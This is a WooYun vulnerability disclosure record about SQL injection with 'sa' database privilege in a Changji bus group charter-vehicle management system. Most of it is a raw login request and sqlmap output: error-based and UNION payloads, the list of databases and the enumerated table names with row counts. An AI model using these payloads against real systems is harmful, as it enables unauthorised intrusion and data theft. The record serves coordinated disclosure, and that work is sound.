{"id": 83243, "wybug_id": "wooyun-2015-0148490", "wybug_title": "昌吉公交集团包租车管理系统SQL注入/sa权限", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-10-22 18:13", "wybug_open_date": "2015-12-10 16:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-10：\t细节向公众公开  简要描述：  详细说明：  \nPOST /log.asp HTTP/1.1Host: **.**.**.**:82User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://**.**.**.**:82/Cookie: ASPSESSIONIDSCBTDSQR=AIJHHJMDHCGDCONIEEOFMBKKConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 41users=admin*&pws=admin&Submit=%B5%C7%C2%BD\n\n参数:users\n\n\n\n\n\n\n\n\n\nsqlmap resumed the following injection point(s) from stored session:---Parameter: #1* ((custom) POST)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: users=admin' AND 8358=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(122)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (8358=8358) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(106)+CHAR(118)+CHAR(113))) AND 'pZii'='pZii&pws=admin&Submit=%B5%C7%C2%BD    Type: UNION query    Title: Generic UNION query (NULL) - 24 columns    Payload: users=admin' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(107)+CHAR(122)+CHAR(112)+CHAR(113)+CHAR(67)+CHAR(86)+CHAR(116)+CHAR(87)+CHAR(115)+CHAR(97)+CHAR(79)+CHAR(121)+CHAR(121)+CHAR(99)+CHAR(113)+CHAR(106)+CHAR(106)+CHAR(118)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- &pws=admin&Submit=%B5%C7%C2%BD---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2000current database:    'bcgl'\n\nsqlmap resumed the following injection point(s) from stored session:---Parameter: #1* ((custom) POST)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: users=admin' AND 8358=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(122)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (8358=8358) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(106)+CHAR(118)+CHAR(113))) AND 'pZii'='pZii&pws=admin&Submit=%B5%C7%C2%BD    Type: UNION query    Title: Generic UNION query (NULL) - 24 columns    Payload: users=admin' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(107)+CHAR(122)+CHAR(112)+CHAR(113)+CHAR(67)+CHAR(86)+CHAR(116)+CHAR(87)+CHAR(115)+CHAR(97)+CHAR(79)+CHAR(121)+CHAR(121)+CHAR(99)+CHAR(113)+CHAR(106)+CHAR(106)+CHAR(118)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- &pws=admin&Submit=%B5%C7%C2%BD---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2000current user:    'sa'sqlmap resumed the following injection point(s) from stored session:---Parameter: #1* ((custom) POST)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: users=admin' AND 8358=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(122)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (8358=8358) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(106)+CHAR(118)+CHAR(113))) AND 'pZii'='pZii&pws=admin&Submit=%B5%C7%C2%BD    Type: UNION query    Title: Generic UNION query (NULL) - 24 columns    Payload: users=admin' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(107)+CHAR(122)+CHAR(112)+CHAR(113)+CHAR(67)+CHAR(86)+CHAR(116)+CHAR(87)+CHAR(115)+CHAR(97)+CHAR(79)+CHAR(121)+CHAR(121)+CHAR(99)+CHAR(113)+CHAR(106)+CHAR(106)+CHAR(118)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- &pws=admin&Submit=%B5%C7%C2%BD---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2000available databases [8]:[*] bcgl[*] cjgj[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] tempdb\n\nDatabase: bcgl+-------------------------+---------+| Table                   | Entries |+-------------------------+---------+| dbo.pj_pjck             | 115119  || dbo.yy_czmx             | 15769   || dbo.bcgl_skmx           | 14677   || dbo.bcgl_bcdj           | 13737   || dbo.pj_jchz             | 7752    || dbo.yy_tame             | 5426    || dbo.pj_pjrk             | 4990    || dbo.aj_bottle_info      | 4560    || dbo.rl_ryda             | 3928    || dbo.sys_Event           | 2863    || dbo.yy_card             | 1554    || dbo.traffic_accident    | 1531    || dbo.car_archives        | 674     || dbo.pj_clxxk            | 377     || dbo.yy_appeal           | 330     || dbo.hq_lessee           | 79      || dbo.hq_rent             | 72      || dbo.cx_decode           | 71      || dbo.hq_house            | 64      || dbo.bcgl_user           | 60      || dbo.sysconstraints      | 51      || dbo.sys_Group           | 26      || dbo.sys_FieldValue      | 23      || dbo.sys_Module          | 20      || dbo.aj_bottle_check     | 16      || dbo.sys_RoleApplication | 10      || dbo.sys_Roles           | 7       || dbo.name_decode         | 6       || dbo.sys_Field           | 5       || dbo.sys_RolePermission  | 5       || dbo.sys_UserRoles       | 5       || dbo.sys_User            | 4       || dbo.pj_gys              | 3       || dbo.syssegments         | 3       || dbo.sys_Applications    | 2       || dbo.yy_rk_tame          | 2       || dbo.aj_bottle_jh        | 1       || dbo.sys_SystemInfo      | 1       |+-------------------------+---------+\n   漏洞证明：     修复方案：  参数过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-10-26 16:44 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发新疆分中心，由其后续协调网站管理单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}